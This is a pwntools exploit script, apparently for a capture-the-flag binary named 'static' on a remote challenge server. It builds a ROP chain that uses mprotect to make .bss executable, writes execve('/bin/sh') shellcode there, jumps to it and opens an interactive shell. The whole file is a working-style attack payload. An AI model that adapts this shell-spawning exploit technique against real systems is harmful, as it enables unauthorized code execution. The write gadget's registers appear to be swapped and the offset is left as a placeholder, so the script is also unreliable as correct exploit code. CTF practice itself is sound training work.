from pwn import *
import sys

# Configuration for the connection and binary file
binary_path = './static'
host = 'static.chal.cyberjousting.com'
port = 1350

binary = ELF(binary_path)

context.update(arch='amd64', os='linux')

# Check if we want to run in local, remote, or debug mode
mode = sys.argv[1] if len(sys.argv) > 1 else 'remote'
if mode not in ['local', 'remote', 'debug']:
    print("Usage: script.py [local|remote|debug]")
    sys.exit(1)

# Start a local process for testing, connect to a remote server, or run in debug mode
if mode == 'local':
    p = process(binary_path)
elif mode == 'debug':
    p = gdb.debug(binary_path, gdbscript='''
        b *main
        continue
    ''', terminal=['tmux', 'splitw', '-h'])
else:
    p = remote(host, port)

# Gadgets and addresses
syscall_ret = 0x0000000000401194  # syscall; ret;
pop_rdi = 0x0000000000401fe0  # pop rdi; ret;
pop_rsi = ROP(binary).find_gadget(['pop rsi', 'ret'])[0]
pop_rax = ROP(binary).find_gadget(['pop rax', 'ret'])[0]
pop_rdx = 0x0000000000432972  # pop rdx; ret;
mov_rax_rsi = 0x00000000004116c1  # mov [rax], rsi; ret;

# Address to the mprotect syscall
mprotect = binary.symbols['mprotect']

# Writable and executable region (assume a region, e.g., .bss)
writable_executable_addr = binary.bss()

# Print addresses for debugging
print(f"writable_executable_addr: {hex(writable_executable_addr)}")
print(f"pop_rdi: {hex(pop_rdi)}")
print(f"pop_rsi: {hex(pop_rsi)}")
print(f"pop_rax: {hex(pop_rax)}")
print(f"pop_rdx: {hex(pop_rdx)}")
print(f"mov_rax_rsi: {hex(mov_rax_rsi)}")
print(f"mprotect: {hex(mprotect)}")

# Build the ROP chain
rop = ROP(binary)

# Use mprotect to make the .bss segment executable
rop.raw([pop_rdi, writable_executable_addr & ~0xfff])  # Align to page start
rop.raw([pop_rsi, 0x1000])  # Page size
rop.raw([pop_rdx, 7])  # RWX permissions
rop.raw(mprotect)

# Manually create shellcode for execve("/bin/sh", NULL, NULL)
# asm equivalent in bytes:
#   xor rsi, rsi
#   xor rdx, rdx
#   mov rdi, <writable_executable_addr>
#   mov rax, 59
#   syscall
manual_shellcode = asm('''
    xor rsi, rsi
    xor rdx, rdx
    mov rdi, %d
    mov rax, 59
    syscall
''' % writable_executable_addr)

# Write /bin/sh to writable_executable_addr
bin_sh = b"/bin/sh\x00"

# Write the /bin/sh string to the .bss segment
rop.raw([pop_rsi, writable_executable_addr])
rop.raw([pop_rax, u64(bin_sh)])
rop.raw(mov_rax_rsi)

# Write the manual shellcode to the .bss segment
for i in range(0, len(manual_shellcode), 8):
    rop.raw([pop_rsi, writable_executable_addr + 8 + i])
    rop.raw([pop_rax, u64(manual_shellcode[i:i+8].ljust(8, b'\x00'))])
    rop.raw(mov_rax_rsi)

# Jump to the shellcode
rop.raw(writable_executable_addr + 8)

# Print the ROP chain for debugging
print("ROP chain:")
print(rop.dump())

# Create the payload
payload = b'A' * 18  # Replace 'offset' with the correct offset to the return address
payload += rop.chain()

# Print the payload as hexdump for inspection
print("Payload hexdump:")
print(hexdump(payload))

# Send the payload
p.sendline(payload)

# Interact with the process
p.interactive()

# Close the connection
p.close()

